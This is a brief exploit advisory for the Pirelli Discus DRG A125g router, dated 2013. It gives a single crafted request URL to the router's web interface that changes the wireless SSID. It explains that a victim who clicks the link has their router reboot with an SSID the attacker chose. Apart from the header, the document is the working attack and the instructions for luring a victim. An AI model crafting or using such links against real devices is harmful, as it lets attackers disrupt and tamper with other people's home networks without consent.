# Exploit Title: Pirelli Discus DRG A125g remote change SSID value
vulnerability
# Hardware: Pirelli Discus DRG A125g
# Date: 2013/11/23
# Exploit Author: Sebastián Magof
# Tested on: Linux/Windows
# Twitter: @smagof
# Greetz: Family, friends && under guys.
# Special Greetz:
# (\/)
# (**) αlpha
#(")(")


#Exploit:

http://10.0.0.2/wlbasic.wl?wlSsidIdx=0&wlSsid=bysmagof

#info: where the parameter "wlSsid"  is where the attacker will enter the
new SSID. If the victim clicks on the url your modem / router will reboot
automatically with the new SSID provided by the attacker.